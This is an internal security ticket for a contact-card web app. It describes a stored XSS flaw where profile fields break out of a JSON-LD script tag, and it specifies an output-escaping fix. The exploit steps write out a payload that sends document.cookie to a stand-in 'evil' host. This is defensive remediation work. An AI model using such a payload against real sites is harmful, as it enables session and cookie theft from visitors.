# SEC-01 — Fix Stored XSS in Public-Card JSON-LD Output

> Severity: **HIGH** · Confirmed exploitable on staging (`kontax.vexon.co`)

## Purpose

Stop attacker-controlled profile fields from breaking out of the JSON-LD
`<script>` tag on public contact cards and executing arbitrary JavaScript in the
browser of anyone who views the card.

## Background

The `JsonLd` component inlines its data with `dangerouslySetInnerHTML` using
`JSON.stringify`:

```tsx
// src/app/_components/json-ld.tsx:10
dangerouslySetInnerHTML={{ __html: JSON.stringify(data) }}
```

`JSON.stringify` does **not** escape `<`, `>`, or `/`. The component was written
for the marketing pages (its comment states "no user input is interpolated"),
but it is also used on the public contact card:

- `src/app/u/[username]/page.tsx:275` renders `<JsonLd data={buildPersonSchema(card)} />`
- `src/server/public-card/get-card.ts` `buildPersonSchema` sets
  `name: card.displayName`, plus `jobTitle`, `company`, `email`, `telephone`,
  `url`/`sameAs` — all from the card owner's own profile.
- `displayName` resolves to `user.name` (`get-card.ts:42`), which is set at
  registration with `z.string().trim().min(1).max(100)` and **no character
  restriction** (`src/app/api/register/route.ts:12`), and is editable in
  settings.
- `/u/[username]` is public and unauthenticated (`src/middleware.ts:47`).

Because the live CSP is `script-src 'self' 'unsafe-inline'`, an injected inline
`<script>` executes — the CSP does not contain this today (see SEC-02).

### Exploit

1. Attacker registers and sets their account name to
   `</script><script>fetch('//evil/'+document.cookie)</script>` (34 chars, well
   under the 100 limit).
2. Attacker sets a username, enabling their public card.
3. Any visitor to `https://kontax.vexon.co/u/<attacker>` executes the attacker's
   JavaScript on the Kontax origin — session/cookie theft, actions performed as
   the victim, etc.

The same breakout applies to any card field rendered into the schema
(`jobTitle`, `company`, website, email, phone).

## Scope

**In scope**
- Safe serialization of JSON-LD data in `src/app/_components/json-ld.tsx`
- Any other `dangerouslySetInnerHTML` sink that serializes user-influenced data

**Out of scope**
- The CSP `'unsafe-inline'` weakness (tracked separately in SEC-02)
- Rewriting the public-card feature or its field model

## Dependencies

- None. This is a self-contained hotfix and should ship independently.

## Design / Implementation Spec

### Desired behavior
- Profile fields containing `<`, `>`, `&`, or `</script>` render as inert text
  inside the JSON-LD block and cannot terminate the `<script>` element.
- Search-engine parsing of the JSON-LD is unaffected (the escapes below are
  valid JSON and decode to the original characters).

### Suggested implementation direction
Inside a `<script>` element the HTML parser ends the raw-text block on the
literal sequence `</script` (case-insensitive), so escaping `<` is the necessary
and sufficient fix. Escaping `>` and `&` as well is harmless defense-in-depth.
(U+2028/U+2029 escaping is *not* needed here — the content type is
`application/ld+json`, which is not parsed as JavaScript.)

```tsx
const json = JSON.stringify(data)
  .replace(/</g, "\\u003c")  // essential — prevents the </script> breakout
  .replace(/>/g, "\\u003e")  // defensive
  .replace(/&/g, "\\u0026"); // defensive

return <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: json }} />;
```

`<` is valid JSON and decodes back to `<`, so search engines read the
schema identically.

Update the stale comment in the component that claims no user input is
interpolated.

### Engineering notes
- Prefer fixing this at the `JsonLd` component so every current and future
  caller is covered, rather than sanitizing each field at the call site.
- Do not attempt to strip/deny characters in `user.name` as the primary fix —
  users legitimately have `<`, `&`, etc. in names; correct output encoding is
  the right layer.

## Acceptance Criteria
- A contact card whose owner's name is `</script><script>alert(1)</script>`
  renders the payload as inert text; no script executes when viewing
  `/u/<username>`.
- JSON-LD remains valid and parseable (verify with Google's Rich Results test or
  a JSON-LD validator).
- Marketing-page JSON-LD is unchanged in output meaning.

## Documentation
- [ ] External · users
- [x] Internal · engineering
- [x] Internal · QA
